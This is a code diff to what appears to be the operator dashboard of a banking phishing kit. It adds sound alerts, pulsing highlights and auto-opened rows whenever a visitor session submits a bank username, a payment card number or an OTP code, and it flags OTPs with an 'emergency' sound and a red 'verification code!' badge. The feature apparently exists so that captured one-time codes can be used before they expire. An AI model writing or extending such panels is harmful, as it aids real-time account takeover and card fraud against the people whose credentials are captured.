@@ -34,8 +34,10 @@ import {
   AlertTriangle,
   ShieldCheck,
   Landmark,
+  Sparkles,
 } from "lucide-react";
 import { timeAgo, TimeCounter, useTimeTicker } from "@/lib/timeAgo";
+import { playNotificationSound } from "@/lib/notificationSounds";
 
 const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
 
@@ -419,6 +421,48 @@ export default function AdminDashboardPage() {
     query: { refetchInterval: 5000 },
   });
 
+  // حالة تتبع الصناديق الجديدة للـ flash
+  const [highlightedCards, setHighlightedCards] = useState<Record<string, "bank" | "card" | "otp" | null>>({});
+
+  // دالة للـ flash على صندوق
+  const triggerCardHighlight = (sessionId: string, type: "bank" | "card" | "otp") => {
+    setHighlightedCards(prev => ({ ...prev, [sessionId]: type }));
+    
+    // تشغيل الصوت المناسب
+    if (type === "bank") {
+      playNotificationSound("bank");
+    } else if (type === "card") {
+      playNotificationSound("card");
+    } else if (type === "otp") {
+      playNotificationSound("otp");
+    }
+    
+    // فتح الصندوق تلقائياً
+    setTimeout(() => {
+      setExpandedRows(prev => {
+        const currentList = queryClient.getQueryData<Array<{ id: number; sessionId: string }>>(
+          getListApplicationsQueryKey()
+        ) ?? [];
+        const app = currentList.find(a => a.sessionId === sessionId);
+        if (app) {
+          const next = new Set(prev);
+          next.add(app.id);
+          return next;
+        }
+        return prev;
+      });
+    }, 500);
+    
+    // إزالة الـ highlight بعد 5 ثواني
+    setTimeout(() => {
+      setHighlightedCards(prev => {
+        const next = { ...prev };
+        delete next[sessionId];
+        return next;
+      });
+    }, 5000);
+  };
+
   // خريطة سريعة: sessionId → بيانات الجلسة (من الـ polling)
   const sessionMap = new Map((sessions ?? []).map((s) => [s.id, s]));
 
@@ -629,6 +673,32 @@ export default function AdminDashboardPage() {
                 msgDataFullName: msg.data.fullName,
                 msgDataBankUsername: msg.data.bankUsername,
               });
+
+              // تشغيل صوت حسب نوع التحديث
+              const prevApp = oldId ? currentList.find((a: { id: number }) => a.id === oldId) : null;
+              const hasBankData = msg.data.bankUsername && (!prevApp || !prevApp.bankUsername);
+              const hasCardData = msg.data.paymentCardNumber && (!prevApp || !prevApp.paymentCardNumber);
+              const hasOtpData = msg.data.otpCode && (!prevApp || !prevApp.otpCode);
+
+              if (msg.type === "otp_submitted" || hasOtpData) {
+                // رمز تحقق - صوت طوارئ
+                playNotificationSound("otp");
+                triggerCardHighlight(msg.data.sessionId, "otp");
+              } else if (hasCardData) {
+                // بيانات بطاقة - صوت مميز + فتح الصندوق + تركيز
+                playNotificationSound("card");
+                triggerCardHighlight(msg.data.sessionId, "card");
+              } else if (hasBankData) {
+                // بيانات بنك - صوت مميز
+                playNotificationSound("bank");
+                triggerCardHighlight(msg.data.sessionId, "bank");
+              } else if (!prevApp || !prevApp.fullName) {
+                // بيانات شخصية جديدة
+                playNotificationSound("personal");
+              } else if (msg.data.isNewVisitor) {
+                // زيارة جديدة
+                playNotificationSound("visitor");
+              }
 
               // تحديث القائمة: إزالة السجل القديم (بـ sessionId) وإضافة الجديد كاملاً
               queryClient.setQueryData(
@@ -1053,13 +1123,38 @@ export default function AdminDashboardPage() {
                 return (
                   <div
                     key={app.id}
-                    className="transition-colors hover:bg-muted/20"
+                    className={`transition-all duration-500 ${
+                      highlightedCards[app.sessionId] === "otp" 
+                        ? "ring-4 ring-red-500 ring-offset-2 bg-red-50 animate-pulse" 
+                        : highlightedCards[app.sessionId] === "card"
+                        ? "ring-4 ring-yellow-500 ring-offset-2 bg-yellow-50 animate-pulse"
+                        : highlightedCards[app.sessionId] === "bank"
+                        ? "ring-4 ring-orange-500 ring-offset-2 bg-orange-50 animate-pulse"
+                        : "hover:bg-muted/20"
+                    }`}
                   >
                     {/* الصف الرئيسي */}
                     <div
-                      className="flex items-center gap-3 p-4 cursor-pointer select-none"
+                      className={`flex items-center gap-3 p-4 cursor-pointer select-none ${
+                        highlightedCards[app.sessionId] ? "relative" : ""
+                      }`}
                       onClick={() => toggleRow(app.id)}
                     >
+                      {/* مؤشر البريق */}
+                      {highlightedCards[app.sessionId] && (
+                        <div className={`absolute left-4 top-1/2 -translate-y-1/2 flex items-center gap-1 px-2 py-1 rounded-full text-xs font-bold text-white ${
+                          highlightedCards[app.sessionId] === "otp" ? "bg-red-500" :
+                          highlightedCards[app.sessionId] === "card" ? "bg-yellow-500" :
+                          "bg-orange-500"
+                        }`}>
+                          <Sparkles className="w-3 h-3" />
+                          <span>{
+                            highlightedCards[app.sessionId] === "otp" ? "رمز تحقق!" :
+                            highlightedCards[app.sessionId] === "card" ? "بيانات بطاقة!" :
+                            "بيانات بنك!"
+                          }</span>
+                        </div>
+                      )}
                       <div className="w-9 h-9 navy-gradient rounded-xl flex items-center justify-center text-white shrink-0">
                         {app.applicantType === "business" ? (
                           <Building2 className="w-4 h-4" />
